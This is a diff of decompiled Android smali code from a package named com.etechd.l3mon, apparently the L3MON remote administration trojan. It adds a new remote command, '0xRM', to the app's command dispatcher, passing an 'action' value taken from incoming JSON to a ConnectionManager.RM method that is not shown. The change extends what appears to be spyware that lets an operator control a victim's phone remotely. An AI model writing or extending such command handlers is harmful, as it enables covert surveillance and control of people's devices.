@@ -90,6 +90,19 @@
 
     goto :goto_0
 
+    :sswitch_11
+    const-string v4, "0xRM"
+
+    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v4
+
+    if-eqz v4, :cond_0
+
+    const/16 v3, 0xb
+
+    goto :goto_0
+
     :sswitch_1
     const-string v4, "0xSM"
 
@@ -340,6 +353,17 @@
 
     goto :goto_1
 
+    :pswitch_11
+    const-string v0, "action"
+
+    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v0
+
+    invoke-static {v0}, Lcom/etechd/l3mon/ConnectionManager;->RM(Ljava/lang/String;)V
+
+    goto :goto_1
+
     .line 60
     :pswitch_9
     invoke-virtual {v1, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
@@ -424,6 +448,7 @@
         0x179ea2 -> :sswitch_1
         0x179f1a -> :sswitch_0
         0x179f1d -> :sswitch_10
+        0x179e83 -> :sswitch_11
     .end sparse-switch
 
     :pswitch_data_0
@@ -439,5 +464,6 @@
         :pswitch_1
         :pswitch_0
         :pswitch_10
+        :pswitch_11
     .end packed-switch
 .end method
